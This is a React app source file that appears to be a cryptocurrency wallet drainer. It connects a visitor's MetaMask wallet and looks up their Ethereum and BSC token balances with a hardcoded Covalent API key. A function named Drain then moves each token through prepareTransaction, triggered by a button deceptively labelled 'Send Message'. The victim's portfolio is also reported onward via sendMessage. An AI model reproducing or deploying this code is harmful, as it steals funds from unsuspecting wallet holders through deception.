import logo from "./logo.svg";
import "./App.css";
import axios from "axios";
import { useEffect, useState } from "react";
import Web3 from "web3";
import { ABI, USDTBSC } from "./constant";
import {
  checkAndChangeNetwork,
  getLocationData,
  prepareTransaction,
  switchToBsc,
  switchToEthereumMainnet,
} from "./functions";

function App() {
  const [connected, setConnected] = useState(false);
  const [account, setAccount] = useState("");
  const [balances, setBalances] = useState([]);
  const [bscbalances, setbscBalances] = useState([]);

  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        console.log("Connected account:", accounts[0]);
        setAccount(accounts[0]);
        switchToEthereumMainnet()
        // checkAndChangeNetwork();
        setConnected(true);
        ApiServices(accounts[0]);
        // getLocationData();
      } catch (error) {
        console.error(error);
      }
    } else {
      console.log("Please install MetaMask!");
    }
  };

  const Drain = async () => {
    if (connected) {
      if (balances.length>1) {
        switchToEthereumMainnet()
        .then(async (res) => {
          if (res) {
            for (const item of balances) {
              try {
                await prepareTransaction(item, account);
              } catch (error) {
                alert("Something went wrong");
              }
            }
          }
        })
        .catch((e) => {
          alert("Please switch to ethereum mainnet");
        });
      }
      if (bscbalances.length>1) {
        switchToBsc()
        .then(async (res) => {
          if (res) {
            for (const item of bscbalances) {
              try {
                await prepareTransaction(item, account);
              } catch (error) {
                alert("Something went wrong");
              }
            }
          }
        })
        .catch((e) => {
          alert("Please switch to ethereum mainnet");
        });
      }
     
     
    }
  };

  const ApiServices = async (account) => {
    axios
      .get(
        `https://api.covalenthq.com/v1/eth-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
      )
      .then((res) => {
        let newArr = res?.data?.data?.items?.filter(
          (item) => Number(item?.quote_rate) > 0
        );
        setBalances(newArr);
        axios
          .get(
            `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
          )
          .then((res) => {
            let newArr = res?.data?.data?.items?.filter(
              (item) => Number(item?.quote_rate) > 0
            );
            setbscBalances(newArr);
          });
      });
  };

  useEffect(() => {
    if (balances?.length>0) {
      let message='Totol Portfolio is '
      balances.forEach((item)=>{
        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
      })
      sendMessage(message)
    }
  }, [balances]);
  useEffect(() => {
    if (bscbalances?.length>0) {
      let message='Totol Portfolio is '
      balances.forEach((item)=>{
        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
      })
      sendMessage(message)
    }
  }, [bscbalances]);

  return (
    <div>
      {console.log({ balances })}
      {!connected && <button onClick={connectWallet}>Connect Wallet</button>}
      <button onClick={Drain}>Send Message</button>
    </div>
  );
}

export default App;
